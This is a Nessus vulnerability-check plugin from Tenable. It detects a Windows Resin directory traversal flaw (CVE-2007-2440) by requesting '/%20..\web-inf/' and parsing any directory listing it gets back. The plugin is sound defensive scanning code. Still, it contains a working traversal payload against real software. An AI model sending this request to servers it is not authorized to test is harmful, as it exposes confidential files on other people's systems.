#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25241);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2007-2440");
  script_bugtraq_id(23985);
  script_xref(name:"OSVDB", value:"36058");

  script_name(english:"Resin for Windows \WEB-INF Traversal Arbitrary File Access");
  script_summary(english:"Tries to get a directory listing of web-apps\ROOT\WEB-INF");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Resin, an application server. 

The installation of Resin on the remote host allows an unauthenticated
remote attacker to gain access to the web-inf directories, or any
known subdirectories, on the affected Windows host, which may lead to
a loss of confidentiality." );
 script_set_attribute(attribute:"see_also", value:"http://www.rapid7.com/advisories/R7-0029.jsp" );
 script_set_attribute(attribute:"see_also", value:"http://www.caucho.com/resin-3.1/changes/changes.xtp" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Resin / Resin Pro 3.1.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8080);

# Make sure the banner is from Resin.
banner = get_http_banner(port:port);
if (!banner || "Resin/" >!< banner) exit(0);


# Try to exploit the flaw.
url = "/%20..\web-inf/";
r = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(r)) exit(0, "the web server did not answer");
res = r[2];


# There's a problem if it looks like we have a directory listing.
if (">Directory of / ..\web-inf/<" >< res)
{
  if (report_verbosity)
  {
    report = string(
      "Nessus was able to get a directory listing using the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n"
    );
    if (report_verbosity > 1)
    {
      inbody = FALSE;
      info = "";
      foreach line (split(res, keep:FALSE))
      {
        if (inbody)
        {
          line = str_replace(find:"<li>", replace:"  * ", string:line);
          line = ereg_replace(pattern:"<[^>]+>", replace:"", string:line);
          info += '  ' + line + '\n';

          if ("</body" >< tolower(line)) inbody = FALSE;
        }
        else if ("<body" >< tolower(line)) inbody = TRUE;
      }
      report = string(
        report,
        "\n",
        "Here is the information extracted :\n",
        "\n",
        info
      );
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
